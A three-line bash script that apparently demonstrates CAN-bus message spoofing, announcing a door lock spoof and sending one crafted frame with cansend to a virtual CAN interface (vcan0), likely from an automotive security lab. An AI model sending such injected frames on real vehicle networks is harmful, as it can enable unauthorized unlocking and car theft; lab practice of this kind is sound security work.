#!/bin/bash
echo "[*] Spoofing door lock command..."
cansend vcan0 111#0101010101010101
